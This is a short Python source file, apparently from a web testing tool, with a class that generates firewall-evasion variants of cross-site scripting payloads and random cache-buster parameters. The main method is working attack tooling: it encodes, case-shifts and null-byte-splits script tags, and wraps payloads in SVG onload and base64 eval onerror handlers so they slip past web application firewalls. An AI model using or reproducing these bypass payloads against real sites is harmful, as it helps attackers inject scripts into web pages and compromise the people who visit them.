import base64

class PayloadMutator:
    """Generate mutations of payloads for bypass techniques and variation."""
    
    @staticmethod
    def mutate_xss_payload(base_payload: str) -> list[str]:
        """Generate common WAF bypass mutations for an XSS payload."""
        mutations = [
            base_payload, # Original
            base_payload.upper(), # Case variation
            base_payload.replace('<', '%3C').replace('>', '%3E'), # URL Encoded
            base_payload.replace(' ', '/**/'), # Comment replacement
            base_payload.replace('script', 'scr\x00ipt'), # Null byte injection
            f"<svg/onload=alert(/{base_payload}/)>", # SVG context
            # Base64 eval wrapper
            f"<img src=x onerror=eval(atob('{base64.b64encode(base_payload.encode()).decode()}'))>",
        ]
        return mutations

    @staticmethod
    def generate_cache_busters() -> list[str]:
        """Generate different styles of cache busters."""
        import time
        import random
        ts = int(time.time())
        return [
            f"cb={ts}_{random.randint(1000,9999)}",
            f"v={ts}",
            f"cache_buster={random.random()}",
            f"rand={random.randint(1, 1000000)}",
        ]
